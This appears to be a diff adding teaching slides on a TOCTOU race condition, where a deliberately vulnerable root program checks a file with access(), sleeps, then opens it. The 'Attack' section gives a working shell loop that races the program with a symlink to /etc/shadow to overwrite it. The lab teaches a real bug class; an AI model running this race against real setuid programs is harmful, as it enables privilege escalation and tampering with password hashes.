@@ -78,3 +78,50 @@ This provides a mechanism for granting administrator privileges, ordinarily re
 ---
 # The Vulnerable Program
 
+---
+# The TOCTOU Bug
+
+A class of software bug caused by a race condition involving:
+
+- The **checking** of the state of a part of a system (such as this check in `vulnerable_root_prog` using `access`),
+- And the **actual use** of the results of that check
+
+We **exaggerate** the `DELAY` between:
+
+1. The time of **CHECK** of the file using `access` and
+2. The time of **USE** (actual usage of the file) using `fopen` by setting `sleep(DELAY)` in betweewhatn the two instructions, where `DELAY` is specified as 1 to simulate 1 second delay.
+
+## Symbolic Link
+A **symbolic** link is a special kind of file that points to another file. It contains a text string that is **automatically interpreted** and followed by the OS as a path to another file or directory.
+
+
+
+--- 
+# The Attack
+```sh
+OLDFILE=`ls -l /etc/shadow`
+NEWFILE=`ls -l /etc/shadow`
+
+while [ "$OLDFILE" = "$NEWFILE" ]
+do
+    rm -f userfile.txt
+    cp userfile_original.txt userfile.txt
+
+    ../Root/vulnerable_root_prog userfile.txt test-user-0 & 
+    ln -sf /etc/shadow userfile.txt & 
+    NEWFILE=`ls -l /etc/shadow`
+done
+```
+
+    ../Root/vulnerable_root_prog userfile.txt test-user-0 & 
+    ln -sf /etc/shadow userfile.txt & 
+- These two commands run **at the same time** (`&` runs them in background):
+
+	**a.** `vulnerable_root_prog`:
+	- Checks if the user has write access to `userfile.txt` (it does — at first).
+	- Waits for 1 second (using `sleep(1)`)
+	- Then opens it and modifies it — **but by that time, it may have changed!**
+
+	**b.** `ln -sf /etc/shadow userfile.txt`:
+	- Replaces `userfile.txt` with a **symbolic link** to `/etc/shadow`.
+
